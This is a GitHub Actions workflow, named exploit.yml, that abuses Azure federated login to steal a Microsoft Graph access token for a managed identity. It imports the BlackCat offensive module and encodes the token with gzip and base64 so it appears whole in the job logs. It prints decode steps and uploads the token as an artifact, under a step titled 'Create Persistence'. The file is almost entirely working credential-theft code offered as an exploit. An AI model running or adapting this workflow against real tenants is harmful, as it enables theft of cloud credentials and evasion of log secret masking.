# .github/workflows/exploit.yml
name: Azure Access
run-name: Federated Token Exchange - Get UAMI Graph Token
on: workflow_dispatch

permissions:
  id-token: write
  contents: read

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Login to Azure
        uses: Azure/Login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          allow-no-subscriptions: true
          enable-AzPSSession: true

      - name: Get Graph Token and Create Persistence
        uses: azure/powershell@v2
        with:
          inlineScript: |
            # Import BlackCat module from checked-out code
            Import-Module -Name "${{ github.workspace }}/BlackCat.psd1" -Force
            
            # Get Graph API token using the authenticated UAMI context
            $tokenResponse = Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com"
            $graphToken = $tokenResponse.Token | ConvertFrom-SecureString -AsPlainText
            
            # GZip compress + Base64 encode â†’ typically fits in a single log line
            $bytes      = [Text.Encoding]::UTF8.GetBytes($graphToken)
            $ms         = [IO.MemoryStream]::new()
            $gz         = [IO.Compression.GZipStream]::new($ms, [IO.Compression.CompressionMode]::Compress)
            $gz.Write($bytes, 0, $bytes.Length)
            $gz.Close()
            $compressed = [Convert]::ToBase64String($ms.ToArray())
            
            Write-Host "=============================================="
            Write-Host "=== GRAPH TOKEN (GZip + Base64) ==="
            Write-Host "=============================================="
            Write-Host $compressed
            Write-Host "=============================================="
            Write-Host ""
            Write-Host "To decode (PowerShell):"
            Write-Host '  $gz = [IO.MemoryStream]::new([Convert]::FromBase64String("<paste>"))'
            Write-Host '  $ds = [IO.Compression.GZipStream]::new($gz, [IO.Compression.DecompressionMode]::Decompress)'
            Write-Host '  $sr = [IO.StreamReader]::new($ds)'
            Write-Host '  $token = $sr.ReadToEnd(); $sr.Close()'
            Write-Host '  ConvertFrom-JWT $token'
            Write-Host ""
            
            # Also save as downloadable artifact (no truncation risk)
            $compressed | Out-File "${{ github.workspace }}/token.gz.b64" -NoNewline
          azPSVersion: "latest"

      - name: Upload Token Artifact
        uses: actions/upload-artifact@v4
        with:
          name: graph-token
          path: token.gz.b64
          retention-days: 1
